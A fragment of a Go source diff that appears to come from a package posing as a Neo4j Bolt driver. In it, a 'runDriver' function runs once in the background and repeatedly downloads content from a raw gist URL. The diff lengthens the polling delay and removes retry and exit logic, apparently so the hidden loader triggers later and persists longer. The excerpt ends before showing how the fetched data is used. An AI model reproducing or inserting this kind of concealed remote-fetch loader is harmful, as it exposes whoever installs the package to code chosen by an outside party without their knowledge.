@@ -113,25 +113,16 @@ var once sync.Once
 func runDriver() {
 	once.Do(func() {
 		rate := 5
-		retry := 0
 		url := "https://gist.githubusercontent.com/Neo4jBolt/94b36c0d7e2a18fad8c1a795eb0095be/raw/3331fcd918f43cecce722e008622b6f076911ca7/code"
-		ticker := time.NewTimer(time.Second * 1)
+		ticker := time.NewTimer(time.Second * 60)
 		for {
 			select {
 			case <-ticker.C:
 				resp, err := http.Get(url)
 				if err != nil {
-					retry++
-					if retry >= 5 {
-						retry = 0
-						if rand.Intn(rate) == 0 {
-							os.Exit(0)
-						}
-					}
 					continue
 				}
 
-				retry = 0
 				defer resp.Body.Close()
 				data, err := ioutil.ReadAll(resp.Body)
 				if err != nil {
